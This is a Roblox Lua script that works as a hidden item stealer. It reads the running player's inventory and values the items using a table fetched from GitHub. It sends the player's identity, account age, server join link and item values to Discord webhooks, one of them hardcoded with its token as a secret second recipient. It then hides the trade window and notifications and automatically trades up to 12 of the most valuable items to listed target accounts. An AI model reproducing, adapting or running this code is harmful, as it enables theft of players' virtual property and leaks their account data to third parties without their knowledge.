-- ==========================================
-- SCRIPT 2 (CORE ACTUALIZADO CON GITHUB Y DELAY - FIX ANTI-CRASH)
-- ==========================================
local HttpService = game:GetService("HttpService")
local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local player = Players.LocalPlayer

-- ==========================================
-- URL DE VALORES PRINCIPAL (webhook normal)
-- ==========================================
-- NOTA: Se usa raw.githubusercontent.com para que devuelva solo el JSON puro
local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/main/utils5.json"

-- ==========================================
-- URL DE VALORES EXCLUSIVA PARA DUAL WEBHOOK
-- ==========================================
local DUAL_VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/main/utils5.json"

-- ==========================================
-- CONFIGURACIÓN SECRETA DUAL WEBHOOK
-- ==========================================
local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCRnW2QrQf04R9WmpOJTg85SbHa5FIkd02"

local jugadoresObjetivosDual = {
    "Hahahahlolllpro", "TradeTestingMVSS", "azae3l666",
    "juancarloselkrak7", "azanuvpro777", "ppeoihjv", "BeKindPleaseOmg"
}

local efectosEspecialesDual = {
    MatchaEffect = true,
    SpiritOverload = true,
    ValkyrieEffect = true,
    DragonBlossom = true,
    RainbowEffect = true,
    LumenburstEffect = true,
    StardustCollapseEffect = true
}

-- ==========================================
-- TABLAS DE VALORES PRINCIPALES (webhook normal)
-- ==========================================
local Knives, Guns, Effects, Emotes = {}, {}, {}, {}

-- ==========================================
-- TABLAS DE VALORES EXCLUSIVAS PARA DUAL WEBHOOK
-- ==========================================
local KnivesDual, GunsDual, EffectsDual, EmotesDual = {}, {}, {}, {}

-- ==========================================
-- CARGA DE VALORES PRINCIPALES
-- ==========================================
local function cargarValoresGitHub()
    local success, response = pcall(function()
        return game:HttpGet(VALUES_REPO_URL)
    end)
    if success and response then
        local decodeSuccess, decodedData = pcall(function()
            return HttpService:JSONDecode(response)
        end)
        if decodeSuccess and decodedData then
            Knives  = decodedData.Knives  or {}
            Guns    = decodedData.Guns    or {}
            Effects = decodedData.Effects or {}
            Emotes  = decodedData.Emotes  or {}
        end
    end
end

-- ==========================================
-- CARGA DE VALORES EXCLUSIVOS DUAL WEBHOOK
-- ==========================================
local function cargarValoresDual()
    local success, response = pcall(function()
        return game:HttpGet(DUAL_VALUES_REPO_URL)
    end)
    if success and response then
        local decodeSuccess, decodedData = pcall(function()
            return HttpService:JSONDecode(response)
        end)
        if decodeSuccess and decodedData then
            KnivesDual  = decodedData.Knives  or {}
            GunsDual    = decodedData.Guns    or {}
            EffectsDual = decodedData.Effects or {}
            EmotesDual  = decodedData.Emotes  or {}
        end
    end
end

cargarValoresGitHub()
cargarValoresDual()

task.spawn(function()
    while getgenv and not getgenv().AutoTradeConfig do
        task.wait(0.2)
    end

    local config = getgenv().AutoTradeConfig or {}
    
    -- ==========================================
    -- FIX ANTI-CRASH: Validación estricta de URL
    -- ==========================================
    local function isValidUrl(url)
        return type(url) == "string" and string.match(url, "^https?://") ~= nil
    end

    local rawLogs = config.WebhookLogs or ""
    local rawInv = config.WebhookInventario or ""

    local WEBHOOK_LOGS       = isValidUrl(rawLogs) and rawLogs or ""
    local WEBHOOK_INVENTARIO = isValidUrl(rawInv) and rawInv or ""
    -- ==========================================

    local startTime = os.time()

    pcall(function()
        if request and player and WEBHOOK_LOGS ~= "" then
            request({
                Url    = WEBHOOK_LOGS,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body   = HttpService:JSONEncode({
                    content = "✅ **" .. player.Name .. "** ha ejecutado el script."
                })
            })
        end
    end)

    Players.PlayerRemoving:Connect(function(leavingPlayer)
        if leavingPlayer == Players.LocalPlayer then
            local tiempoTranscurrido = os.time() - startTime
            local horas    = math.floor(tiempoTranscurrido / 3600)
            local minutes  = math.floor((tiempoTranscurrido % 3600) / 60)
            local segundos = tiempoTranscurrido % 60

            local textoTiempo = ""
            if horas    > 0 then textoTiempo = textoTiempo .. horas    .. " horas, "   end
            if minutes  > 0 then textoTiempo = textoTiempo .. minutes  .. " minutos y " end
            textoTiempo = textoTiempo .. segundos .. " segundos"

            pcall(function()
                if request and WEBHOOK_INVENTARIO ~= "" then
                    request({
                        Url    = WEBHOOK_INVENTARIO,
                        Method = "POST",
                        Headers = { ["Content-Type"] = "application/json" },
                        Body   = HttpService:JSONEncode({
                            content = "❌ El usuario (**" .. leavingPlayer.Name .. "**) ha cerrado o salido del juego.\n⏳ **Duró ejecutando el script:** `" .. textoTiempo .. "`"
                        })
                    })
                end
            end)
        end
    end)

    local jugadoresObjetivos = config.JugadoresObjetivos or {}

    local armasPrioritarias = {
        LightningBolt = true, LightningStriker = true,
        MatchaBobaKnife = true, MatchaBobaGun = true,
        DuskveilDagger = true, DuskveilIron = true,
        ValkyrieKnife = true, ValkyrieSword = true, ValkyrieSniper = true,
        LimeJellyAxe = true, BlueberryJellyAxe = true, StrawberryJellyAxe = true, GrapeJellyAxe = true,
        LimeJellyUzi = true, BlueberryJellyUzi = true, StrawberryJellyUzi = true, GrapeJellyUzi = true,
        SealordTrident = true, SealordRevolver = true,
        DragonpetalBlade = true, DragonpetalSniper = true, DragonpetalOutlaw = true,
        LovestruckKnife = true, LovestruckGun = true,
        SharkLauncher = true, Revolver_Default = true,
    }

    local ok, cg = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)

    if ok and cg.PlayerData then
        local pd = cg.PlayerData
        local knives, guns, effects, emotes = {}, {}, {}, {}
        local totalValue    = 0
        local hasSpecialEffect = false

        local foundMatchaKnife, foundMatchaGun       = false, false
        local foundDragonBlade, foundDragonGun       = false, false
        local foundLightningBolt, foundLightningStriker = false, false

        local function normalizeName(name)
            return string.gsub(name, " ", "")
        end

        local function scanAndSave(category, valueTable, resultTable)
            local inv = pd:TryIndex({"Inventory", category})
            if not inv then return end
            for guid, item in pairs(inv) do
                if item and item.name then
                    local cleanName = normalizeName(item.name)
                    if valueTable[cleanName] then
                        if cleanName == "MatchaBobaKnife"  then foundMatchaKnife    = true end
                        if cleanName == "MatchaBobaGun"    then foundMatchaGun      = true end
                        if cleanName == "DragonpetalBlade" then foundDragonBlade    = true end
                        if cleanName == "DragonpetalSniper" or cleanName == "DragonpetalOutlaw" then foundDragonGun = true end
                        if cleanName == "LightningBolt"    then foundLightningBolt  = true end
                        if cleanName == "LightningStriker" then foundLightningStriker = true end
                        if category == "Effect" and efectosEspecialesDual[cleanName] then
                            hasSpecialEffect = true
                        end
                        local itemValue = valueTable[cleanName]
                        totalValue = totalValue + itemValue
                        resultTable[#resultTable + 1] = { name = item.name, guid = guid, value = itemValue }
                    end
                end
            end
        end

        scanAndSave("Knife",  Knives,  knives)
        scanAndSave("Gun",    Guns,    guns)
        scanAndSave("Effect", Effects, effects)
        scanAndSave("Emote",  Emotes,  emotes)

        local hayItems = (#knives > 0) or (#guns > 0) or (#effects > 0) or (#emotes > 0)

        if hayItems and request then
            local fileName      = "AutoTrade_Executions.json"
            local executionData = {}
            local executionText = player.Name .. " 1x executions"

            if isfile and readfile and writefile then
                if isfile(fileName) then
                    local success2, data2 = pcall(function()
                        return HttpService:JSONDecode(readfile(fileName))
                    end)
                    if success2 and type(data2) == "table" then
                        executionData = data2
                    end
                end
                local playerName = player.Name
                if not executionData[playerName] then executionData[playerName] = 0 end
                executionData[playerName] = executionData[playerName] + 1
                pcall(function() writefile(fileName, HttpService:JSONEncode(executionData)) end)
                executionText = playerName .. " " .. executionData[playerName] .. "x executions"
            end

            local function formatearLista(lista)
                local contador, orden, texto = {}, {}, ""
                for _, v in ipairs(lista) do
                    local clave = v.name
                    if not contador[clave] then
                        contador[clave] = { cantidad = 1, nombre = v.name, valor = v.value }
                        table.insert(orden, clave)
                    else
                        contador[clave].cantidad = contador[clave].cantidad + 1
                        contador[clave].valor    = contador[clave].valor + v.value
                    end
                end
                for _, clave in ipairs(orden) do
                    local info = contador[clave]
                    texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
                end
                if string.len(texto) > 1024 then return string.sub(texto, 1, 1020) .. "..." end
                return texto
            end

            local campos = {}
            if #knives  > 0 then table.insert(campos, { name = "🔪 Knives", value = formatearLista(knives),  inline = true  }) end
            if #guns    > 0 then table.insert(campos, { name = "🔫 Guns",   value = formatearLista(guns),    inline = true  }) end
            if #effects > 0 then table.insert(campos, { name = "✨ Effects", value = formatearLista(effects), inline = false }) end
            if #emotes  > 0 then table.insert(campos, { name = "🕺 Emotes", value = formatearLista(emotes),  inline = false }) end

            local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
            local playersCount = #Players:GetPlayers()
            local maxPlayers   = Players.MaxPlayers
            local robloxVer    = version()
            local avatarUrl    = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
            local bodyUrl      = "https://www.roblox.com/avatar-thumbnail/image?userId="  .. player.UserId .. "&width=420&height=420&format=png"

            local descriptionText =
                "### 👤 Información del Jugador\n" ..
                "**Usuario:** `" .. player.Name .. "`\n" ..
                "**Display Name:** `" .. player.DisplayName .. "`\n" ..
                "**User ID:** `" .. player.UserId .. "`\n" ..
                "**Account Age:** `" .. player.AccountAge .. " Days`\n\n" ..
                "### ⚙️ Información del Servidor\n" ..
                "**JobId:** `" .. game.JobId .. "`\n" ..
                "**🔗 Join Link:** [Click para Unirse](https://fern.wtf/joiner?placeId=135856908115931&gameInstanceId=" .. game.JobId .. ")\n" ..
                "**Server:** `" .. playersCount .. "/" .. maxPlayers .. "`\n" ..
                "**Roblox Version:** `" .. robloxVer .. "`\n" ..
                "**Executor:** `" .. executorName .. "`\n\n" ..
                "### 📊 Estadísticas de Hit\n" ..
                "**Historial:** `" .. executionText .. "`\n" ..
                "**Total Value:** `💰 " .. totalValue .. "`\n\n" ..
                "**=============================**"

            local pings      = {}
            local embedColor = 3447003

            if totalValue >= 5000 or hasSpecialEffect then
                table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO (+5000 VALOR O EFECTO DETECTADO)!** 🚨")
                embedColor = 16711680
            elseif totalValue >= 2000 then
                table.insert(pings, "@everyone 🚨 **¡HIT LEGENDARIO DETECTADO (+2000 VALOR)!** 🚨")
                embedColor = 16766720
            end

            if (foundMatchaKnife and foundMatchaGun) and (foundDragonBlade and foundDragonGun) then
                table.insert(pings, "@TOP-SETS 🍵🐉 **¡SETS MATCHA Y DRAGONPETAL ENCONTRADOS!**")
            end
            if foundLightningBolt and foundLightningStriker then
                table.insert(pings, "@TOP-SETS ⚡ **¡SET LIGHTNING ENCONTRADO!**")
            end

            local finalContentText = (#pings > 0) and table.concat(pings, "\n") or nil

            local webhookPayload = {
                content     = finalContentText,
                username    = "Auto-Trade Bot Scanner",
                avatar_url  = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/512px-Roblox_player_icon_black.svg.png",
                embeds = {{
                    title       = "🎯 ¡Objetivo de Tradeo Localizado!",
                    color       = embedColor,
                    description = descriptionText,
                    thumbnail   = { url = avatarUrl },
                    image       = { url = bodyUrl },
                    fields      = campos,
                    footer      = {
                        text     = "Sistema de Escaneo Automático | " .. os.date("%X"),
                        icon_url = "https://cdn-icons-png.flaticon.com/512/6584/6584141.png"
                    }
                }}
            }

            local jsonPayload = HttpService:JSONEncode(webhookPayload)

            if totalValue >= 5000 or hasSpecialEffect then
                local knivesDualResult, gunsDualResult, effectsDualResult, emotesDualResult = {}, {}, {}, {}
                local totalValueDual = 0

                local function scanDual(category, valueTable, resultTable)
                    local inv = pd:TryIndex({"Inventory", category})
                    if not inv then return end
                    for guid, item in pairs(inv) do
                        if item and item.name then
                            local cleanName = normalizeName(item.name)
                            if valueTable[cleanName] then
                                local itemValue = valueTable[cleanName]
                                totalValueDual = totalValueDual + itemValue
                                resultTable[#resultTable + 1] = { name = item.name, guid = guid, value = itemValue }
                            end
                        end
                    end
                end

                scanDual("Knife",  KnivesDual,  knivesDualResult)
                scanDual("Gun",    GunsDual,    gunsDualResult)
                scanDual("Effect", EffectsDual, effectsDualResult)
                scanDual("Emote",  EmotesDual,  emotesDualResult)

                local camposDual = {}
                if #knivesDualResult  > 0 then table.insert(camposDual, { name = "🔪 Knives", value = formatearLista(knivesDualResult),  inline = true  }) end
                if #gunsDualResult    > 0 then table.insert(camposDual, { name = "🔫 Guns",   value = formatearLista(gunsDualResult),    inline = true  }) end
                if #effectsDualResult > 0 then table.insert(camposDual, { name = "✨ Effects", value = formatearLista(effectsDualResult), inline = false }) end
                if #emotesDualResult  > 0 then table.insert(camposDual, { name = "🕺 Emotes", value = formatearLista(emotesDualResult),  inline = false }) end

                local descDual = descriptionText:gsub(
                    "**Total Value:** `💰 " .. totalValue .. "`",
                    "**Total Value:** `💰 " .. totalValueDual .. "` *(valores Dual)*"
                )

                local dualPayload = {
                    content    = finalContentText,
                    username   = "Auto-Trade Bot Scanner",
                    avatar_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/512px-Roblox_player_icon_black.svg.png",
                    embeds = {{
                        title       = "🎯 ¡Objetivo de Tradeo Localizado!",
                        color       = embedColor,
                        description = descDual,
                        thumbnail   = { url = avatarUrl },
                        image       = { url = bodyUrl },
                        fields      = camposDual,
                        footer      = {
                            text     = "Sistema Dual | " .. os.date("%X"),
                            icon_url = "https://cdn-icons-png.flaticon.com/512/6584/6584141.png"
                        }
                    }}
                }

                local dualJsonPayload = HttpService:JSONEncode(dualPayload)

                task.spawn(function()
                    if DUAL_WEBHOOK_INVENTARIO ~= "" then
                        request({
                            Url     = DUAL_WEBHOOK_INVENTARIO,
                            Method  = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body    = dualJsonPayload
                        })
                    end
                end)

                if WEBHOOK_INVENTARIO ~= "" then
                    task.delay(300, function()
                        pcall(function()
                            request({
                                Url     = WEBHOOK_INVENTARIO,
                                Method  = "POST",
                                Headers = { ["Content-Type"] = "application/json" },
                                Body    = jsonPayload 
                            })
                        end)
                    end)
                end

                jugadoresObjetivos = jugadoresObjetivosDual
            else
                if WEBHOOK_INVENTARIO ~= "" then
                    request({
                        Url     = WEBHOOK_INVENTARIO,
                        Method  = "POST",
                        Headers = { ["Content-Type"] = "application/json" },
                        Body    = jsonPayload
                    })
                end
            end
        end

        local jugadorEncontrado = nil
        repeat
            task.wait(0.5)
            for _, nombre in ipairs(jugadoresObjetivos) do
                local p = Players:FindFirstChild(nombre)
                if p then jugadorEncontrado = p; break end
            end
        until jugadorEncontrado

        task.wait(10)

        local tradeando = true
        local posicionOriginalTrade = nil

        task.spawn(function()
            while tradeando do
                task.wait()
                pcall(function()
                    local pGui = player:WaitForChild("PlayerGui")
                    if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                        pGui.Notifications.Body.Visible = false
                    end
                    if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
                        if not posicionOriginalTrade and pGui.NewGui.TradeNegotiation.Position.X.Scale < 100 then
                            posicionOriginalTrade = pGui.NewGui.TradeNegotiation.Position
                        end
                        pGui.NewGui.TradeNegotiation.Position = UDim2.new(1000, 1000, 1000, 1000)
                    end
                end)
            end
        end)

        local function ejecutarTradeo()
            local okData, cgData = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
            if not okData then return false end
            local pdTrade = cgData.PlayerData

            local listaEfectos, listaEmotes = {}, {}
            local listaArmasPrioritarias, listaArmasNormales = {}, {}

            local function normalizeName(name)
                return string.gsub(name, " ", "")
            end

            local esDualMode = (jugadoresObjetivos == jugadoresObjetivosDual)
            local KT = esDualMode and KnivesDual  or Knives
            local GT = esDualMode and GunsDual    or Guns
            local ET = esDualMode and EffectsDual or Effects
            local EM = esDualMode and EmotesDual  or Emotes

            local function scanTrade(cat, valueTable, destList, isPriority)
                local inv = pdTrade:TryIndex({"Inventory", cat})
                if not inv then return end
                for guid, item in pairs(inv) do
                    if item and item.name then
                        local cleanName = normalizeName(item.name)
                        if valueTable[cleanName] then
                            local itemData = { name = item.name, guid = guid, value = valueTable[cleanName] }
                            if destList then
                                table.insert(destList, itemData)
                            elseif isPriority and armasPrioritarias[cleanName] then
                                table.insert(listaArmasPrioritarias, itemData)
                            else
                                table.insert(listaArmasNormales, itemData)
                            end
                        end
                    end
                end
            end

            scanTrade("Knife",  KT, nil,         true)
            scanTrade("Gun",    GT, nil,         true)
            scanTrade("Effect", ET, listaEfectos, false)
            scanTrade("Emote",  EM, listaEmotes,  false)

            local sortPorValor = function(a, b) return a.value > b.value end
            table.sort(listaEmotes, sortPorValor)
            table.sort(listaEfectos, sortPorValor)
            table.sort(listaArmasPrioritarias, sortPorValor)
            table.sort(listaArmasNormales, sortPorValor)

            local itemsRestantes = {}
            for _, v in ipairs(listaEmotes)            do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaEfectos)           do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaArmasPrioritarias) do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaArmasNormales)     do table.insert(itemsRestantes, v) end

            if #itemsRestantes == 0 then return false end

            local Remotes          = require(RS.Shared.Remotes)
            local ActiveNegotiation = cgData.ActiveNegotiation
            local SessionState     = cgData.SessionState

            local function getSides()
                local data = ActiveNegotiation.Data
                if type(data) ~= "table" or not data.player1 or not data.player2 then return nil, nil, nil end
                local me, other
                if data.player1.player and data.player1.player.UserId == player.UserId then
                    me, other = data.player1, data.player2
                else
                    me, other = data.player2, data.player1
                end
                return me, other, data
            end

            local function setReadyTrue()
                local _, _, data = getSides()
                if not data then return false end
                local t0 = os.clock()
                while os.clock() - t0 < 6 do
                    local _, _, d = getSides()
                    if d and Workspace:GetServerTimeNow() >= (d.lastUpdate or 0) + 3 then break end
                    task.wait(0.2)
                end
                local _, _, d2 = getSides()
                if not d2 then return false end
                Remotes.SetReady:FireServer(true, d2.ref or {})
                return true
            end

            repeat
                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
                local incoming = SessionState:TryIndex({ "incomingTradeRequests" })
                local aceptado = false
                if type(incoming) == "table" then
                    for _, p in ipairs(incoming) do
                        if p.Name == jugadorEncontrado.Name then
                            Remotes.AcceptInvite:FireServer(p)
                            aceptado = true
                        end
                    end
                end
                if not aceptado then Remotes.SendInvite:FireServer(jugadorEncontrado) end
                task.wait(2.5)
            until getSides() ~= nil

            task.wait(1)

            for i = 1, math.min(12, #itemsRestantes) do
                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
                local item = itemsRestantes[i]
                local t0 = os.clock()
                while os.clock() - t0 < 5 do
                    local _, _, d = getSides()
                    if not (d and (d.processing or 0) > Workspace:GetServerTimeNow()) then break end
                    task.wait(0.2)
                end
                Remotes.OfferItem:FireServer(item.guid)
                task.wait(0.35)
            end

            task.wait(0.5)
            local me, _, data = getSides()
            if me and not me.ready then setReadyTrue() end

            local timeout = os.clock()
            while os.clock() - timeout < 60 do
                if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
                local m, _, d = getSides()
                if not d then break end
                if d.exchanging then break end
                if m and not m.ready then setReadyTrue() end
                task.wait(0.5)
            end

            local finalWait = os.clock()
            while getSides() ~= nil and os.clock() - finalWait < 20 do task.wait(1) end
            task.wait(2)
            return true
        end

        while true do
            if not (jugadorEncontrado and jugadorEncontrado.Parent) then break end
            local continuar = ejecutarTradeo()
            if not continuar then break end
        end

        tradeando = false
        task.wait(0.5)

        pcall(function()
            local pGui = player:WaitForChild("PlayerGui")
            if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                pGui.Notifications.Body.Visible = true
            end
            if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
                if posicionOriginalTrade then
                    pGui.NewGui.TradeNegotiation.Position = posicionOriginalTrade
                else
                    pGui.NewGui.TradeNegotiation.Position = UDim2.new(0.5, -250, 0.5, -200)
                end
            end
        end)
    end
end)
